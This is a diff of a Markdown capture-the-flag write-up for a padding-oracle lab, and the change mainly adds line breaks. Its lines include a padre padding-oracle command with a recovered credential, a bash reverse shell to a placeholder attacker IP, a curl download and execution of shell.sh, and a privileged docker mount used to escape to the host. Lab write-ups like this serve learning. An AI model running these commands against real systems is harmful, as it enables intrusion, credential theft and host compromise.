@@ -43,40 +43,40 @@ IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-In Site: 
-![](Assets/nyf1.png)
-In code view I found a script:
-![](Assets/nyf2.png)
-In Debug page code view:
-![](Assets/nyf3.png)
-According to the first script I added a cookie named `loggedin` and refreshed the page and the admin buffot changed to DEBUG
-![](Assets/nyf4.png)
-Clicking the stefan test I found 
-![](Assets/nyf5.png)
-Using the padre tool I decrypted the blob
+In Site:  <br/>
+![](Assets/nyf1.png) <br/>
+In code view I found a script: <br/>
+![](Assets/nyf2.png) <br/>
+In Debug page code view: <br/>
+![](Assets/nyf3.png) <br/>
+According to the first script I added a cookie named `loggedin` and refreshed the page and the admin buffot changed to DEBUG <br/>
+![](Assets/nyf4.png) <br/>
+Clicking the stefan test I found  <br/>
+![](Assets/nyf5.png) <br/>
+Using the padre tool I decrypted the blob 
 ```bash
 padre -u "http://10.10.222.223:8080/api/debug/$" -e lhex -err "Decryption error" "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"
 ```
-![](Assets/nyf6.png)
-So the decrypted blob is
-`stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599`
-Using this credential I logged in as admin and got the admin flag. 
-![](Assets/nyf7.png)
-Now do the following to get the shell:
-Create a file with the following reverse shell 
+![](Assets/nyf6.png) <br/>
+So the decrypted blob is <br/>
+`stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599` <br/>
+Using this credential I logged in as admin and got the admin flag.  <br/>
+![](Assets/nyf7.png) <br/>
+Now do the following to get the shell: <br/>
+Create a file with the following reverse shell
 ```bash
 /bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
 ```
-Open a http server on the attacking machine and upload the file. 
-Upload the file to the server executing the following command on the page.
+Open a http server on the attacking machine and upload the file. <br/>
+Upload the file to the server executing the following command on the page. <br/>
 `curl http://<attacker_ip:attacker_port>/shell.sh -o /tmp/shell.sh`
-Open a listening port on the port 4444 to get the reverse shell.
-Give the shell executing privilege and execute it runnig the following command on the site. 
-`chmod +x /tmp/shell.sh && bash /tmp/shell.sh`
-![](Assets/nyf8.png)
+Open a listening port on the port 4444 to get the reverse shell. <br/>
+Give the shell executing privilege and execute it runnig the following command on the site.  <br/>
+`chmod +x /tmp/shell.sh && bash /tmp/shell.sh` <br/>
+![](Assets/nyf8.png) <br/>
 
-The flag-2 is in the `/app/docker-compose.yml`
-To escape the docker do the following:
+The flag-2 is in the `/app/docker-compose.yml` <br/>
+To escape the docker do the following: <br/>
 ```bash
 root@02e849f307cc:/tmp# docker images
 REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
@@ -85,7 +85,7 @@ padding-oracle-app_web   latest    cd6261dd9dda   11 months ago   1.01GB
 gradle                   7-jdk11   d5954e1d9fa4   12 months ago   687MB
 openjdk                  11        47a932d998b7   2 years ago     654MB
 ```
-Using the image ID of gradle `d5954e1d9fa4`.
-Running the following command:
-`docker run -it --privileged  -v /:/mnt/ d5954e1d9fa4 chroot /mnt/ bash`
-![](Assets/nyf9.png)
+Using the image ID of gradle `d5954e1d9fa4`. <br/>
+Running the following command: <br/>
+`docker run -it --privileged  -v /:/mnt/ d5954e1d9fa4 chroot /mnt/ bash` <br/>
+![](Assets/nyf9.png) <br/>
